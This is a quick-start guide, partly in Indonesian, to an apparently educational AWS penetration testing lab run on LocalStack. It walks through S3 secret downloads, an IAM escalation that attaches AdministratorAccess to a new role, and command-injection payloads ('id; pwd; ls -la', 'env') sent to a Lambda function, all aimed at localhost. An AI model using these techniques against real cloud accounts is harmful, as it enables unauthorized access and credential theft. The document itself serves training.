# AWS Penetration Testing Lab - Quick Start Guide

## 🎯 Apa yang Akan Anda Pelajari

Setelah menyelesaikan lab ini, Anda akan memahami:

1. **AWS Security Fundamentals**
   - IAM (Identity and Access Management)
   - S3 bucket security
   - Lambda function security
   - DynamoDB access controls

2. **Common AWS Vulnerabilities**
   - Misconfigured S3 buckets
   - IAM privilege escalation
   - Lambda code injection
   - API Gateway bypasses

3. **Penetration Testing Methodology**
   - Reconnaissance techniques
   - Enumeration methods
   - Exploitation strategies
   - Post-exploitation activities

## 🚀 Quick Start (5 menit setup)

### Step 1: Start LocalStack
```powershell
# Start AWS LocalStack
docker-compose up -d

# Verify it's running
curl http://localhost:4566/health
```

### Step 2: Setup Dependencies
```powershell
# Install Python dependencies
pip install -r requirements.txt

# Install AWS CLI (jika belum ada)
# Download dari: https://aws.amazon.com/cli/
```

### Step 3: Setup Vulnerable Environment
```powershell
# Create vulnerable AWS resources
python aws_pentest_toolkit.py setup

# Verify setup
python aws_pentest_toolkit.py assess
```

## 🔍 Penetration Testing Scenarios

### Scenario 1: S3 Bucket Takeover (Pemula)
**Objective**: Find dan exploit public S3 buckets

```powershell
# 1. Discovery
python aws_pentest_toolkit.py s3

# 2. Manual enumeration
aws --endpoint-url=http://localhost:4566 s3 ls

# 3. Download sensitive files
aws --endpoint-url=http://localhost:4566 s3 cp s3://vulnerable-pentest-bucket/secrets/api-keys.txt .
```

**What to look for**:
- Public read/write permissions
- Sensitive files (configs, backups, logs)
- Credentials in file contents

### Scenario 2: IAM Privilege Escalation (Intermediate)
**Objective**: Escalate from limited user to admin

```powershell
# 1. Enumerate current permissions
python aws_pentest_toolkit.py iam

# 2. Look for privilege escalation paths
# - Can create roles?
# - Can attach policies?
# - Can assume roles?

# 3. Create admin role (if possible)
aws --endpoint-url=http://localhost:4566 iam create-role --role-name PWNedRole --assume-role-policy-document file://trust-policy.json

# 4. Attach admin policy
aws --endpoint-url=http://localhost:4566 iam attach-role-policy --role-name PWNedRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Scenario 3: Lambda Code Injection (Advanced)
**Objective**: Execute commands through vulnerable Lambda

```powershell
# 1. Find vulnerable Lambda functions
python aws_pentest_toolkit.py lambda

# 2. Test command injection
curl -X POST http://localhost:4566/2015-03-31/functions/vulnerable-cmd-exec/invocations \
  -H "Content-Type: application/json" \
  -d '{"command": "id; pwd; ls -la"}'

# 3. Extract environment variables
curl -X POST http://localhost:4566/2015-03-31/functions/vulnerable-cmd-exec/invocations \
  -H "Content-Type: application/json" \
  -d '{"command": "env"}'
```

### Scenario 4: DynamoDB Data Extraction (Intermediate)
**Objective**: Extract sensitive data from DynamoDB

```powershell
# 1. Enumerate tables
python aws_pentest_toolkit.py dynamodb

# 2. Scan for sensitive data
aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name vulnerable-users

# 3. Look for:
# - Plain text passwords
# - API keys
# - Personal information
# - Credit card numbers
```

## 🛠️ Essential Commands Cheat Sheet

### AWS CLI Commands
```powershell
# Configure AWS CLI for LocalStack
aws configure set aws_access_key_id test
aws configure set aws_secret_access_key test
aws configure set region us-east-1

# S3 Commands
aws --endpoint-url=http://localhost:4566 s3 ls                          # List buckets
aws --endpoint-url=http://localhost:4566 s3 ls s3://bucket-name/        # List objects
aws --endpoint-url=http://localhost:4566 s3 cp s3://bucket/file.txt .   # Download file

# IAM Commands
aws --endpoint-url=http://localhost:4566 iam list-users                 # List users
aws --endpoint-url=http://localhost:4566 iam list-roles                 # List roles
aws --endpoint-url=http://localhost:4566 iam list-attached-user-policies --user-name USERNAME

# Lambda Commands
aws --endpoint-url=http://localhost:4566 lambda list-functions          # List functions
aws --endpoint-url=http://localhost:4566 lambda invoke --function-name FUNCTION response.json

# DynamoDB Commands
aws --endpoint-url=http://localhost:4566 dynamodb list-tables           # List tables
aws --endpoint-url=http://localhost:4566 dynamodb scan --table-name TABLE_NAME
```

### Python Toolkit Commands
```powershell
python aws_pentest_toolkit.py setup     # Setup vulnerable environment
python aws_pentest_toolkit.py assess    # Full security assessment
python aws_pentest_toolkit.py s3        # S3 enumeration only
python aws_pentest_toolkit.py iam       # IAM enumeration only
python aws_pentest_toolkit.py lambda    # Lambda analysis only
python aws_pentest_toolkit.py dynamodb  # DynamoDB enumeration only
```

## 🔍 What to Look For (Red Flags)

### S3 Security Issues
- ✅ Public read/write permissions
- ✅ Sensitive files (configs, backups, logs)
- ✅ Credentials in file contents
- ✅ No encryption at rest
- ✅ Missing access logging

### IAM Security Issues
- ✅ Wildcard permissions (*)
- ✅ Overprivileged users/roles
- ✅ Cross-account trust with *
- ✅ Missing MFA requirements
- ✅ Unused credentials

### Lambda Security Issues
- ✅ Command injection vulnerabilities
- ✅ Secrets in environment variables
- ✅ Overprivileged execution roles
- ✅ No input validation
- ✅ Information disclosure in errors

### DynamoDB Security Issues
- ✅ Over-broad read permissions
- ✅ Sensitive data in plain text
- ✅ No encryption at rest
- ✅ Missing access controls

## 📊 Assessment Report Template

Setelah testing, document findings Anda:

### Executive Summary
- Number of vulnerabilities found
- Risk levels (Critical/High/Medium/Low)
- Business impact assessment

### Technical Findings
For each vulnerability:
- **Vulnerability**: What is the issue?
- **Location**: Where was it found?
- **Impact**: What's the potential damage?
- **Evidence**: Screenshots/commands
- **Remediation**: How to fix it?

### Recommendations
- Immediate actions (0-30 days)
- Short-term improvements (30-90 days)
- Long-term security strategy (90+ days)

## 🎓 Learning Path

### Beginner (Week 1-2)
1. Complete S3 scenarios
2. Learn AWS CLI basics
3. Understand IAM fundamentals
4. Practice with toolkit

### Intermediate (Week 3-4)
1. IAM privilege escalation
2. Lambda exploitation
3. DynamoDB enumeration
4. API Gateway testing

### Advanced (Week 5-6)
1. Chain multiple vulnerabilities
2. Write custom exploitation scripts
3. Automate assessment processes
4. Create comprehensive reports

## 🔗 Additional Resources

### Documentation
- [AWS Security Best Practices](https://aws.amazon.com/security/security-resources/)
- [OWASP Cloud Security](https://owasp.org/www-project-cloud-security/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

### Tools
- [Scout Suite](https://github.com/nccgroup/ScoutSuite) - AWS security auditing
- [Prowler](https://github.com/prowler-cloud/prowler) - AWS security best practices
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) - AWS exploitation framework

### Training
- AWS Security Specialty Certification
- Cloud Security Alliance (CSA) Training
- SANS Cloud Security Courses

## ⚠️ Important Reminders

1. **Use Only for Learning**: This lab is for educational purposes only
2. **LocalStack Only**: Never test these techniques on real AWS accounts without permission
3. **Responsible Disclosure**: If you find real vulnerabilities, report them responsibly
4. **Legal Compliance**: Always follow applicable laws and regulations
5. **Ethical Guidelines**: Use knowledge for defense, not offense

## 🆘 Troubleshooting

### LocalStack Not Starting
```powershell
# Check Docker status
docker ps

# Check logs
docker-compose logs localstack

# Restart services
docker-compose down
docker-compose up -d
```

### AWS CLI Not Working
```powershell
# Verify configuration
aws configure list

# Test connection
curl http://localhost:4566/health
```

### Python Scripts Failing
```powershell
# Install dependencies
pip install -r requirements.txt

# Check Python version
python --version  # Should be 3.7+
```

Happy hacking! 🔐💻